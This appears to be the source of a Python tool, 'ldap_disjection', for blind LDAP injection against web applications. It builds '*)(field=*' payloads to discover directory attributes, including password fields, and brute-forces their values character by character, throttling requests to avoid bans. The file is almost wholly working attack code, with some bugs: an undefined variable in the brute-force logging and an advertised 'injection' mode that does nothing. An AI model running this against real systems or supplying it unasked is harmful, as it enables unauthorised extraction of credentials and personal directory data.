#!/usr/bin/python3
# ldap_disjection.py
import logging
import requests
from sys import exit
from os.path import isfile
import string
from time import sleep
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import quote
import argparse

__version__ = "1.0.0"

logging.basicConfig()
logger = logging.getLogger("ldap_disjection")
disable_warnings(InsecureRequestWarning)

class WebLdapScanner:

    def __init__(self, **kwargs):
        self.prms = None
        self.init_prms(**kwargs)
        self.print_start_msg()

    def init_prms(self, **kwargs):
        self.prms = {
            'mode': kwargs.get('mode'),
            'req_type': 'GET',
            'url': kwargs.get('url'),
            'prm_start': kwargs.get('prm_start'),
            'value_start': kwargs.get('value_start'),
            'brute_prm': kwargs.get('brute_prm'),
            'cond': kwargs.get('cond'),
            'neg_cond': kwargs.get('neg_cond'),
            'word_list': kwargs.get('word_list'),
            'sleep_req': 0.2,
            'req_per_second': 5.0,
            'debug': False,
        }

        if kwargs.get('post') is True:
            self.prms['req_type'] = 'POST'

        if kwargs.get('debug') is True:
            self.prms['debug'] = True

        if isinstance(kwargs.get('sleep_req'), str):
            try:
                self.prms['sleep_req'] = float(kwargs.get('sleep_req'))
                self.prms['req_per_second'] = WebLdapScanner.get_request_per_second(
                    sleep_req=self.prms.get('sleep_req')
                )
            except:
                logger.info(f"[*] Invalid sleep_req value, by default is set to 0.2 s.")
                pass


    def read_word_list(self, word_list: str):
        if isfile(word_list):
            with open(word_list, "r") as f:
                for line in f:
                    yield line.strip()
        else:
            raise Exception("Bad word list file.")

    def get_word_list(self, word_list=None):
        if isinstance(word_list, str):
            for field in self.read_word_list(word_list):
                yield str(field)
        else:
            fields = WebLdapScanner.get_basic_fields()
            nb_fields = len(fields)
            logger.warning(f"[*] Word List length : {nb_fields}")
            logger.warning(f"[*] Estimation time for every character : {nb_fields/self.prms.get('req_per_second')}s")
            for field in fields:
                yield str(field)

    def discover_fields(self, **kwargs):
        (url,
         prm_start,
         value_start,
         cond,
         neg_cond,
         word_list,
         req_type,
         sleep_req,
         debug) = WebLdapScanner.get_discover_prms(**kwargs).values()

        fields = []
        logger.warning(f"[*] Start Discover valid LDAP fields.")
        payload = ""
        url_base = WebLdapScanner.get_base_url(url, prm_start, value_start)

        for field in self.get_word_list(word_list):

            if field != prm_start:
                if req_type == "GET":
                    payload = f"{url_base}*)({field}=*"
                    r = requests.get(payload)
                else:
                    payload = {prm_start:'*)('+field+'=*'}
                    r = requests.post(url, data = payload)

                is_cond = cond is not None and cond in r.text
                is_neg_cond = neg_cond is not None and neg_cond not in r.text

                is_valid_field = (cond is None or is_cond is True) \
                    and (neg_cond is None or is_neg_cond is True)

                WebLdapScanner.print_discover_line(
                        payload=payload,
                        field=field,
                        status_code=r.status_code,
                        text=r.text,
                        is_cond=is_cond,
                        is_neg_cond=is_neg_cond,
                        is_valid_field=is_valid_field
                    )

                if is_valid_field:
                    fields.append(field)
                    
                sleep(sleep_req)
        return fields

    def brute_field_value(self, **kwargs):
        (url,
         prm_start,
         value_start,
         brute_prm,
         cond,
         neg_cond,
         req_type,
         sleep_req,
         req_per_second) = WebLdapScanner.get_brute_prms(**kwargs).values()
        
        alphabet = string.ascii_letters + string.digits +  "_@{}-/()!\"$%=^[]:; "
        url_base = WebLdapScanner.get_base_url(url, prm_start, value_start)

        logger.warning(f"[*] Start LDAP BruteFoce value of Field : {brute_prm}")
        logger.debug(f"[*] Characters : {alphabet}")
        logger.warning(f"[*] Estimation time for every character : {len(alphabet)/req_per_second}s")
        flag = ""
        char_add = None
        run = True
        max_loops = 100
        test_spe_char = True
        i=0
        while run:
            if i > max_loops:
                run =  False
            has_found_char = False
            
            for char in alphabet:
                if char_add is not None:
                    quoted = f"{char_add}{char}"
                else:
                    quoted = char #WebLdapScanner.get_quoted(char)
                payload = f"{url_base}*)({brute_prm}={flag}{quoted}*"
                r = requests.post(payload)
                #r = FakeRequest()
                is_cond = cond is not None and cond in r.text
                is_neg_cond = neg_cond is not None and neg_cond not in r.text

                is_valid_field = (cond is None or is_cond is True) \
                    and (neg_cond is None or is_neg_cond is True)

                WebLdapScanner.print_brute_field_value(
                    payload=payload,
                    flag=flag,
                    status_code=r.status_code,
                    text=r.text,
                    is_cond=is_cond,
                    is_neg_cond=is_neg_cond,
                    is_valid_field=is_valid_field
                )

                if is_valid_field:
                    has_found_char = True
                    test_spe_char = True
                    char_add = None
                    flag += quoted
                    sleep(sleep_req)
                    break
                else:
                    sleep(sleep_req)
            i += 1
            
            if test_spe_char is True and has_found_char is False:
                logger.info(f"[*] Next char not found, test with '*'. Flag status : {flag}")
                char_add = "*"
                test_spe_char = False
            elif test_spe_char is False and has_found_char is False:
                logger.warning(f"[*] Found {len(flag)} characters, field {brute_prm} value is '{flag}'.")
                run =  False
        return flag

    def run(self):
        result = None
        if self.prms.get('mode') == "discover":
            result = self.discover_fields(**self.prms)
        elif self.prms.get('mode') == "brutforce":
            result = self.brute_field_value(**self.prms)
        return result

    @staticmethod
    def get_quoted(char):
        special_characters = ['!', '*', "'", '(', ')', ';', ':', '@', '&', '=', '+', '$', ',', '/', '?', '#', '[', ']']
        if char in special_characters:
            return quote(char)
        return char

    @staticmethod
    def get_discover_prms(**kwargs):
        keys_to_get = [
            'url',
            'prm_start',
            'value_start',
            'cond',
            'neg_cond',
            'word_list',
            'req_type',
            'sleep_req',
            'debug'
        ]
        return {key: kwargs.get(key) for key in keys_to_get if key in kwargs}

    @staticmethod
    def get_brute_prms(**kwargs):
        keys_to_get = [
            'url',
            'prm_start',
            'value_start',
            'brute_prm',
            'cond',
            'neg_cond',
            'req_type',
            'sleep_req',
            'req_per_second'
        ]
        return {key: kwargs.get(key) for key in keys_to_get if key in kwargs}

    @staticmethod
    def get_basic_fields():
        return [
        "c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber",
        "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail",
        "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password",
        "sn", "st", "surname", "uid", "username", "description",
        "userPassword", "userpassword", "userPassword", "lmpassword", "ntpassword"
    ]

    @staticmethod
    def get_base_url(url, prm_start, value_start):
        url_base = f"{url}?{prm_start}"
        if isinstance(value_start, str):
            url_base += f"={value_start}"
        else:
            url_base += f"="

        return url_base

    @staticmethod
    def get_base_post_data(url, prm_start, value_start):
        return None


    @staticmethod
    def print_discover_line(payload: str,
                            field: str,
                            status_code: int,
                            text: str,
                            is_cond: bool,
                            is_neg_cond: bool,
                            is_valid_field: bool):
        if is_valid_field:
            logger.info(f"[*] --------------------")
            logger.info(f"[*] Payload : {payload}")
            logger.info(f"Field: {field}")
            logger.info(f"Content Length: {len(text)}")
        else:
            logger.debug(f"[*] --------------------")
            logger.debug(f"[*] Payload : {payload}")
            logger.debug(f"Field: {field}")
            logger.debug(f"Content Length: {len(text)}")
        logger.debug(f"[*] Request status code : {status_code}")
        logger.debug(f"[*] Is cond active and in Response text : {is_cond}")
        logger.debug(f"[*] Is neg_cond active and not in Response text : {is_neg_cond}")
        logger.debug(f"[*] Is Valid Field : {is_valid_field}")
        logger.debug(f"Content Length: {len(text)}")
        logger.debug(f"[*] Response text : {text}")
        logger.debug(f"[*] --------------------")
    
    @staticmethod
    def print_brute_field_value(payload: str,
                                flag: str,
                                status_code: int,
                                text: str,
                                is_cond: bool,
                                is_neg_cond: bool,
                                is_valid_field: bool):

        if is_valid_field:
            logger.info(f"[*] --------------------")
            logger.info(f"[*] Payload : {payload}")
            logger.info(f"Flag: {flag}")
            logger.info(f"Content Length: {len(text)}")
        else:
            logger.debug(f"[*] --------------------")
            logger.debug(f"[*] Payload : {payload}")
            logger.debug(f"Field: {field}")
            logger.debug(f"Content Length: {len(text)}")
        logger.debug(f"[*] Request status code : {status_code}")
        logger.debug(f"[*] Is cond active and in Response text : {is_cond}")
        logger.debug(f"[*] Is neg_cond active and not in Response text : {is_neg_cond}")
        logger.debug(f"[*] Is Valid Field : {is_valid_field}")
        logger.debug(f"Content Length: {len(text)}")
        logger.debug(f"[*] Response text : {text}")
        logger.debug(f"[*] --------------------")
    
    @staticmethod
    def get_request_per_second(sleep_req):
        result = -1
        if sleep_req > 0:
            result = 1 / sleep_req
        return result

    def print_start_msg(self):
        logger.warning(f"[*] Url : {self.prms.get('url')}")
        logger.warning(f"[*] Request Type : {self.prms.get('req_type')}")
        logger.warning(f"[*] Requests per second : {self.prms.get('req_per_second')}s")

class AppFilter(logging.Filter):
    """
    Class used to add a custom entry into the logger
    """

    def filter(self, record):
        record.app_version = "ldap_disjection-%s" % __version__
        return True

class CustomFormatter(logging.Formatter):

    grey = '\x1b[38;21m'
    blue = '\x1b[38;5;39m'
    yellow = '\x1b[38;5;226m'
    red = '\x1b[38;5;196m'
    bold_red = '\x1b[31;1m'
    reset = '\x1b[0m'

    def __init__(self, fmt):
        super().__init__()
        self.fmt = fmt
        self.FORMATS = {
            logging.DEBUG: self.grey + self.fmt + self.reset,
            logging.INFO: self.blue + self.fmt + self.reset,
            logging.WARNING: self.yellow + self.fmt + self.reset,
            logging.ERROR: self.red + self.fmt + self.reset,
            logging.CRITICAL: self.bold_red + self.fmt + self.reset
        }

    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt, "%Y-%m-%d %H:%M:%S")
        return formatter.format(record)

def configure_logging(debug: bool=False, level: int=3):
    """
    Prepare log folder in current home directory.

    :param debug: If true, set the lof level to debug

    """
    logger = logging.getLogger("ldap_disjection")
    logger.addFilter(AppFilter())
    logger.propagate = False
    stdout_handler = logging.StreamHandler()

    fmt = '%(asctime)s :: %(app_version)s :: %(message)s'
    stdout_handler.setFormatter(CustomFormatter(fmt))

    if debug is True:
        logger.setLevel(logging.DEBUG)
    elif level > 0 and level <= 5:
        logger.setLevel(level * 10)
    else:
        logger.setLevel(logging.INFO)

    # add the handlers to logger
    logger.addHandler(stdout_handler)
    
    logger.debug(f"Logger is ready. level : {logging.getLevelName(logger.getEffectiveLevel())}")


def parse_args():
    """
    Parsing function
    :param args: arguments passed from the command line
    :return: return parser
    """
    # create arguments
    parser = argparse.ArgumentParser(description="Discover and blin LDAP fields")
    parser.add_argument("-m", "--mode", 
                        help="Specify the mode: discover | injection | brutforce", 
                        required=True, 
                        choices=["discover", "injection", "brutforce"])
    parser.add_argument("-u", "--url", 
                        help="Specify the target URL", 
                        required=True)

    parser.add_argument("-ps", "--prm_start", 
                        help="Specify the starting GET or POST parameter", 
                        required=True)
    parser.add_argument("-pv", "--value_start", 
                        help="Specify the starting parameter")
    parser.add_argument("-pb", "--brute_prm", 
                        help="Specify the parameter to brute force")

    parser.add_argument("-c", "--cond", 
                        help="Specify the text who must be present on result for success")
    parser.add_argument("-cn", "--neg_cond",
                        help="Specify the text who must not be present on result for success")

    parser.add_argument("-w", "--word_list", 
                        help="Specify the word list")
    parser.add_argument("-s", "--sleep_req", 
                        help="Sleep value between requests to Avoid brute-force bans default to 0.2s")

    parser.add_argument("-G", "--get", 
                        help="Specify GET request type", 
                        action="store_true" )
    parser.add_argument("-P", "--post", 
                        help="Specify POST request type", 
                        action="store_true" )
    parser.add_argument("-ll", "--log_level", 
                        help="Specify the log verbosity level", 
                        choices=range(1, 5),
                        type=int,
                        default=2)
    parser.add_argument("-d", "--debug", help="Specify if debug is activated", action="store_true" )
    parser.add_argument('-v', '--version', action='version',
                        version=f'ldap_disjection {__version__}')

    # parse arguments from script parameters
    return parser.parse_args()


if __name__ == "__main__":
    
    try:
        parser = parse_args()
    except SystemExit:
        exit(1)
    
    configure_logging(debug=parser.debug, level=parser.log_level)
    logger.warning(f"---------- LDAP Disjection ----------")
    wls = WebLdapScanner(**vars(parser))
    wls.run()